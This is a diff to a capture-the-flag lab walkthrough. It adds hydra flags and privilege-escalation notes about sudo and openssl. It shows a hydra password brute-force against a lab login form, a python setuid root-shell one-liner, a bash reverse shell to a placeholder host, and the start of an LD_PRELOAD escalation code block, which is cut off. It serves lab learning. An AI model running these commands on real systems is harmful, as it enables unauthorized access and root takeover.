@@ -132,7 +132,7 @@ python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
 
 
 ```
-hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.228.111 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect"
+hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.228.111 http-post-form "/api/login:username=^USER^&password=^PASS^:Incorrect" -IV
 ```
 ![image](images/plague.png)
 
@@ -147,12 +147,22 @@ password: twentyone<br />
 ```
 bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
-![image](images/bash.png) ![image](images/nc.png)
+![image](images/bash.png)
+
+ ![image](images/nc.png)
 
 
 ##### You can get a rev shell with user `production` logged in and can achieve privilage escalation using this c code -<br />
 
-Check out this blog for more on it [ld_preload-privesc](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
+First, let's try to check for `sudo abilities` of user production by running command:<br />
+
+`sudo -l`<br />
+
+![image](images/productionSudo.png)
+
+We see `openssl` in sudo list, we can abuse it to get root let's check it's [Gtfo-Bins For Library Load Using Openssl](https://gtfobins.github.io/gtfobins/openssl/#library-load)
+
+Check out this blog for more on it [ld_preload-privesc](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)<br />
 
 ```c
 #include <stdio.h>
